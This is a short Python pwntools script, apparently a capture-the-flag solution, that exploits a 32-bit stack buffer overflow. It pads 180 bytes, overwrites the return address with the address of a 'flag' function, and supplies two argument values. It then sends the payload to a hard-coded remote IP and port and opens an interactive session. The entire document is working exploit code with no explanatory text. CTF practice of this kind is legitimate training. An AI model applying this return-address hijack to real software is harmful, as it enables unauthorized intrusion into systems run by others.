#!/usr/bin/env python3


import math

from pwn import *

def roundup(x):
    return int(math.ceil(x / 2.0)) * 2 

def int_to_bytes_string(hex_value, max_len = 8):
    hex_str = format(hex_value, 'x')
    byte_str = bytes.fromhex(hex_str.rjust(roundup(len(hex_str)), '0'))
    return byte_str.rjust(max_len, b'\x00')[::-1]
    
def hex_to_bytes_string(hex_value):
    hex_str = f"{hex_value}"
    byte_str = bytes.fromhex(hex_str.rjust(roundup(len(hex_str)), '0'))
    return byte_str.rjust(8, b'\x00')[::-1]
    
# Addresses of interest
param_1 = 0xdeadbeef
param_2 = 0xc0ded00d
flag_fun = 0x080491e2

# Exploit

buf = b""
buf += b"A" * 180
buf += b"B" * 8
buf += int_to_bytes_string(flag_fun, 4)
buf += b"C" * 4
buf += int_to_bytes_string(param_1, 4)
buf += int_to_bytes_string(param_2, 4)
buf += b"E" * 4

with open("exploit", "wb") as f:
    f.write(buf + b"\n")


r = remote('68.183.38.225', 31499)
r.sendline(buf + b"\n")
r.interactive()
